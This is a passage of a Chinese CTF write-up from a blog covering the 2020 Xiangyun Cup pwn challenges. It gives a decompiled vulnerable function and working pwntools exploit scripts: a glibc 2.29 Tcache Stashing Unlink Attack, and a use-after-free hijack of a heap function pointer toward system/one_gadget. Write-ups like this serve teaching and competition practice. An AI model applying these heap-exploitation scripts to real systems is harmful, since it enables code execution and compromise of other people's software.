<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>2020祥云杯 Pwn WP | I0gan's blog</title><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script>var config = {"root":"/","path":""}</script><script src="//unpkg.com/mermaid@8.13.5/dist/mermaid.min.js"></script><script>mermaid.initialize({
 startOnLoad: true
 , theme: 'dark'
});</script><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.4.0/styles/atom-one-dark-reasonable.min.css"><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body style="background-image:url(https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg);"><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><ol class="navContent"><li class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></li><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/shell/"><span class="navItemTitle">Shell</span></a></li></ol></nav><div class="search-popup"><div id="search-result"></div></div></header><article><div id="post-bg"><div id="post-title"><h1>2020祥云杯 Pwn WP</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2020-11-24T14:47:47.000Z" id="date"> 2020-11-24</time></div></span><br><span>Last Update: <div class="control"><time datetime="2022-10-24T09:01:35.367Z" id="updated"> 2022-10-24</time></div></span><br><span>Word Count: <div class="control">5.9k</div></span><br><span>Read Time: <div class="control">31 min</div></span></div></div><hr><div id="post-content"><h1 id="祥云杯-2020-WP"><a href="#祥云杯-2020-WP" class="headerlink" title="祥云杯 2020 WP"></a>祥云杯 2020 WP</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次比赛打得不是很好，第一个题从比赛开始一直做，做到下午5点还没做出来，只好看其他pwn了，拿到可以实现修改rip了，但是打所有one_gadget都失败，打到一个，不能输入命令执行，只好去看我接的那个项目了，当天就是截至日期，我的项目里还存在几个错误，对方一直在催，我只好再改改项目中的代码，但是还是不会写测试代码，不知道那边测试机制是啥。。。然后又继续干pwn了，在libc中一直找gadget想来控制一下rdi寄存器，并且调用system函数，setcontext中的gadget可以实现，但是开辟的堆太小了，没法使用该gadget，我只好再找找其他的gadget，找到一个可以修改rsp寄存器的gadget，我采用该gadget来打one_gadget，想不到还通了。。。晚上10点第一个pwn，后面心情爽多了，晚上11点又干出到影流之主，该题听说是个cve，熬夜继续干，先是看了把嘴闭上，实在没思路，有继续看第一个pwn了，换了另一种思路，凌晨3点出了这道。接下来只剩下内核pwn和一个没头绪的把嘴闭上了，我就没看了，一觉睡到9点，听说上了道pwn，匆忙的从寝室去实验室，不到半小时把这新上的题做了。又开始看内核pwn和把嘴闭上，自己毛病犯了，一点小事把自己搞得跟颓废的狗，就没继续打比赛了，这里就不说了，对不住了各位师傅，望见谅！离比赛结束还有两个多小时，看着队伍名次掉到30后了，自己也坐不住了，继续打pwn，听另一位师傅说该体是一个cve，给了个该bug的报告网站，我看了下，可以利用该漏洞来修改top chunk，但是bug提交者提供的poc感觉只是对堆的top chunk 该往下边去了，没发现啥，但是在poc中两次调用mallopt的中间加一个malloc(0x1f)，可以实现吧top chunk 指向main_arena + 88处，也就可以在下次分配的时候分配到main_arena + 0x88处，本来想修改top chunk实现任意地址开辟，但是不能自定义修改top chunk指针，后面又想覆写<code>_IO_2_1_stout_</code>结构体，伪造虚表，发现好多main_arena中的值都不能修改，一直卡死，直到比赛结束，灰溜溜的就回寝室睡觉了。。。</p>
<p>这次比赛总排名19，学到了不少东西，各位师傅辛苦了，尤其是web，misc，crypto，re，表现都很不错，给个赞！！！ d0g3起飞～～</p>
<h2 id="PWN1-Beauty-Of-ChangChun"><a href="#PWN1-Beauty-Of-ChangChun" class="headerlink" title="PWN1 [Beauty_Of_ChangChun]"></a>PWN1 [Beauty_Of_ChangChun]</h2><p>该题是glibc2.29以上的利用，若开辟大小大于或等于0x100会存在个uaf漏洞，且开辟大小存在范围的，且采用calloc开辟，没法直接利用uaf漏洞来修改tcache bin的fd实现劫持，后面就想采用unsorted bin attack楼改global_max_fast为一个大值，这样就可以采用fastbin attack攻击手段，在我使用unsorted bin attack的时候总是失败，网上一搜，原来glibc2.29以上unsorted bin attack基本已经失效，后面了解到small bin可以代替unsorted bin attack，也了解到glibc.2.29以上一种攻击Tcache Stashing Unlink Attack可以实现任意地址开辟或者unsorted bin attack效果。就学习该手段，一心只想修改global_max_fast后采用fastbin attack，calloc(1, 0x100)次数只能使用3次，有就放弃了该念头，然后想采用Tcache Stashing Unlink Attack来实现任意地址开辟，也搞了半天，tcache bin已经满了，也不能采用其他的大小的small bin，采用unsorted bin 分割搞了半天，还是实现不了其他大小small bin连续两个堆块的连接，后面就做项目去了。。。凌晨过来继续看，我将目光指向了打印flag函数的检查机制，若我能够修改程序初始化的key值，然后再在某个堆中填写我们修改的key值，绕过检查即可打印flag，修改mmap中的随机数key值就采用Tcache Stashing Unlink Attack来修改为main_arena附近的地址，类似与unsorted bin attack，在堆中存放计算好的main_arena附近地址就行，绕过之后就可打印flag。</p>
<h3 id="vul"><a href="#vul" class="headerlink" title="vul"></a>vul</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">del</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-1Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;idx:&quot;</span>);<br>  v1 = inputn();<br>  <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">9</span> &amp;&amp; p_size[v1] )<br>  &#123;<br>    <span class="hljs-built_in">free</span>((<span class="hljs-type">void</span> *)p_arr[v1]);<br>    LOBYTE(p_size[v1]) = <span class="hljs-number">0</span>;                     <span class="hljs-comment">// vul</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: i0gan</span><br><span class="hljs-comment"># Env: Linux arch 5.8.14-arch1-1</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>elf_path  = <span class="hljs-string">&#x27;pwn&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;/glibc/2.29/64/lib/libc.so.6&#x27;</span><br><br><span class="hljs-comment"># remote server ip and port</span><br>server_ip = <span class="hljs-string">&quot;112.126.71.170&quot;</span><br>server_port = <span class="hljs-number">43652</span><br><br><span class="hljs-comment"># if local debug</span><br>LOCAL = <span class="hljs-number">0</span><br>LIBC  = <span class="hljs-number">1</span><br><br><span class="hljs-comment">#--------------------------func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>	<span class="hljs-keyword">if</span>(LOCAL):<br>		gdb.attach(io)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ad</span>(<span class="hljs-params">sz</span>):<br>	sla(<span class="hljs-string">&#x27;scenery\n&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;size:&#x27;</span>, <span class="hljs-built_in">str</span>(sz))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rm</span>(<span class="hljs-params">i</span>):<br>	sla(<span class="hljs-string">&#x27;scenery\n&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(i))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md</span>(<span class="hljs-params">i, d</span>):<br>	sla(<span class="hljs-string">&#x27;scenery\n&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(i))<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, d)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dp</span>(<span class="hljs-params">i</span>):<br>	sla(<span class="hljs-string">&#x27;scenery\n&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(i))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ad2</span>(<span class="hljs-params">d</span>):<br>	sla(<span class="hljs-string">&#x27;scenery\n&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>)<br>	s(d)<br>	<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ad3</span>():<br>	sla(<span class="hljs-string">&#x27;scenery\n&#x27;</span>, <span class="hljs-string">&#x27;666&#x27;</span>)<br><br><br><span class="hljs-comment"># glibc 2.29 ~ 2.32</span><br><span class="hljs-comment">#--------------------------exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	li(<span class="hljs-string">&#x27;exploit...&#x27;</span>)<br>	ru(<span class="hljs-string">&#x27;ple\n&#x27;</span>)<br>	flag_addr = <span class="hljs-built_in">int</span>(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>	li(<span class="hljs-string">&#x27;flag_addr: &#x27;</span> + <span class="hljs-built_in">hex</span>(flag_addr))<br>	ad(<span class="hljs-number">0x100</span>)<br>	ad(<span class="hljs-number">0x80</span>)  <span class="hljs-comment"># 1 avoid unsorted bin merge</span><br>	rm(<span class="hljs-number">1</span>)<br>	ad(<span class="hljs-number">0x100</span>) <span class="hljs-comment"># 1</span><br>	ad(<span class="hljs-number">0x80</span>)  <span class="hljs-comment"># 2 avoid top chunk merge, and use for small bin</span><br><br>	rm(<span class="hljs-number">0</span>)<br>	<span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>		md(<span class="hljs-number">0</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>))<br>		rm(<span class="hljs-number">0</span>)<br><br>	dp(<span class="hljs-number">0</span>)<br>	leak = u64(ru(<span class="hljs-string">&#x27;\x0a\x48&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>	heap = leak - <span class="hljs-number">0x260</span><br><br>	li(<span class="hljs-string">&#x27;heap: &#x27;</span> + <span class="hljs-built_in">hex</span>(heap))<br>	md(<span class="hljs-number">0</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>))<br>	rm(<span class="hljs-number">0</span>)<br><br>	dp(<span class="hljs-number">0</span>)<br>	leak = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">5</span>:] + <span class="hljs-string">b&#x27;\x7f\x00\x00&#x27;</span>)<br>	malloc_hook = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span><br>	libc_base = malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>	global_max_fast = libc_base + libc.sym[<span class="hljs-string">&#x27;global_max_fast&#x27;</span>]<br>	main_arena = malloc_hook + <span class="hljs-number">0x10</span><br>	li(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>	li(<span class="hljs-string">&#x27;malloc_hook: &#x27;</span> + <span class="hljs-built_in">hex</span>(malloc_hook))<br>	<span class="hljs-comment">#chunk_addr = heap + 0xc8</span><br><br>	rm(<span class="hljs-number">1</span>)<br>	ad3()<br><br>	md(<span class="hljs-number">1</span>, p64(heap + <span class="hljs-number">0x250</span>) + p64(flag_addr - <span class="hljs-number">0x10</span>))<br>	<span class="hljs-comment">#md(1, p64(0) + p64(flag_addr - 0x10))</span><br>	ad2(p64(main_arena + <span class="hljs-number">0x352</span>) + p64(heap + <span class="hljs-number">0x3f0</span>))<br><br>	rm(<span class="hljs-number">2</span>)<br>	ad(<span class="hljs-number">0x100</span>) <span class="hljs-comment"># modify random num</span><br><br>	md(<span class="hljs-number">2</span>, p64(main_arena + <span class="hljs-number">352</span>))<br>	sla(<span class="hljs-string">&#x27;scenery\n&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>)<br>	sl(<span class="hljs-string">&#x27;2&#x27;</span>)<br>	<span class="hljs-comment">#db()</span><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><br><span class="hljs-comment">#--------------------------main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<br>	<span class="hljs-keyword">if</span> LOCAL:<br>		elf = ELF(elf_path)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br>			io = elf.process(env = &#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )<br>		<span class="hljs-keyword">else</span>:<br>			io = elf.process()<br>	<br>	<span class="hljs-keyword">else</span>:<br>		elf = ELF(elf_path)<br>		io = remote(server_ip, server_port)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br><br>	exploit()<br>	finish()<br><br></code></pre></td></tr></table></figure>



<h2 id="PWN2-baby-dev"><a href="#PWN2-baby-dev" class="headerlink" title="PWN2[baby dev]"></a>PWN2[baby dev]</h2><p>一看是内核pwn，应该是个溢出漏洞采用ret2user利用手段吧，看了几下就没看了。。。tcl学kenel pwn去。。。。</p>
<h2 id="PWN3-baby-pwn"><a href="#PWN3-baby-pwn" class="headerlink" title="PWN3[baby pwn]"></a>PWN3[baby pwn]</h2><p>这个题是个c++ pwn，运行后直接开辟直接崩溃，我大为惊喜，分析逆向代码有点乱，采用exp乱试一番，发现程序崩溃，因为程序有个指针函数调用，且该函数指针存放在堆中，若能修改该函数指针，即可实现修改rip，这是个uaf漏洞，先通过打印函数leak出libc，再修改该函数指针为one_gadget，但是所有one_gadget都不通，在libc中找了半天的gadget，最终找到个改变rsp的gadget调整一下one_gadget中的execve第二个参数，远程通了。。</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: i0gan</span><br><span class="hljs-comment"># Env: Linux arch 5.8.14-arch1-1</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li  = <span class="hljs-keyword">lambda</span> x : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br><br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>elf_path  = <span class="hljs-string">&#x27;pwn&#x27;</span><br>MODIFY_LD = <span class="hljs-number">0</span><br>arch = <span class="hljs-string">&#x27;64&#x27;</span><br>libc_v = <span class="hljs-string">&#x27;2.23&#x27;</span><br><br>ld_path   = <span class="hljs-string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="hljs-string">&#x27;/&#x27;</span> + arch + <span class="hljs-string">&#x27;/lib/ld-linux-x86-64.so.2&#x27;</span><br>libs_path = <span class="hljs-string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="hljs-string">&#x27;/&#x27;</span> + arch + <span class="hljs-string">&#x27;/lib&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="hljs-string">&#x27;/&#x27;</span> + arch + <span class="hljs-string">&#x27;/lib/libc.so.6&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br><br><span class="hljs-comment"># change ld path </span><br><span class="hljs-keyword">if</span>(MODIFY_LD):<br>	os.system(<span class="hljs-string">&#x27;cp &#x27;</span> + elf_path + <span class="hljs-string">&#x27; &#x27;</span> + elf_path + <span class="hljs-string">&#x27;.bk&#x27;</span>)<br>	change_ld_cmd = <span class="hljs-string">&#x27;patchelf  --set-interpreter &#x27;</span> + ld_path +<span class="hljs-string">&#x27; &#x27;</span> + elf_path<br>	os.system(change_ld_cmd)<br>	li(<span class="hljs-string">&#x27;modify ld ok!&#x27;</span>)<br>	exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># remote server ip and port</span><br>server_ip = <span class="hljs-string">&quot;8.131.69.237&quot;</span><br>server_port = <span class="hljs-number">52642</span><br><br><span class="hljs-comment"># if local debug</span><br>LOCAL = <span class="hljs-number">0</span><br>LIBC  = <span class="hljs-number">1</span><br><br><span class="hljs-comment">#--------------------------func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>	<span class="hljs-keyword">if</span>(LOCAL):<br>		gdb.attach(io)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init</span>():<br>	sla(<span class="hljs-string">&#x27;exit&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)	<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cre</span>():<br>	sla(<span class="hljs-string">&#x27;exit&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)	<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ad</span>(<span class="hljs-params">sz</span>):<br>	sla(<span class="hljs-string">&#x27;exit&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)	<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(sz))	<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">se</span>(<span class="hljs-params">d</span>):<br>	sla(<span class="hljs-string">&#x27;exit&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)	<br>	sa(<span class="hljs-string">&#x27;:&#x27;</span>, d)	<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dp</span>():<br>	sla(<span class="hljs-string">&#x27;exit&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>)	<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">size</span>():<br>	sla(<span class="hljs-string">&#x27;exit&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>)	<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">q</span>():<br>	sla(<span class="hljs-string">&#x27;exit&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>)	<br><br><span class="hljs-comment">#--------------------------exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	li(<span class="hljs-string">&#x27;exploit...&#x27;</span>)<br>	init()<br>	cre()<br>	ad(<span class="hljs-number">0x88</span>)<br><br>	dp()<br>	ru(<span class="hljs-string">&#x27;show:&#x27;</span>)<br>	r(<span class="hljs-number">9</span>)<br>	heap = u64(r(<span class="hljs-number">8</span>))<br>	li(<span class="hljs-string">&#x27;heap: &#x27;</span> + <span class="hljs-built_in">hex</span>(heap))<br>	ad(<span class="hljs-number">0x88</span>)<br>	init()<br>	dp()<br>	leak = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">5</span>:] + <span class="hljs-string">b&#x27;\x7f\x00\x00&#x27;</span>)<br>	libc_base = leak - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]  - <span class="hljs-number">0x10</span>  - <span class="hljs-number">88</span><br>	og = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>	<span class="hljs-comment">#gadget = libc_base + 0x115260</span><br>	setcontext = libc_base + libc.sym[<span 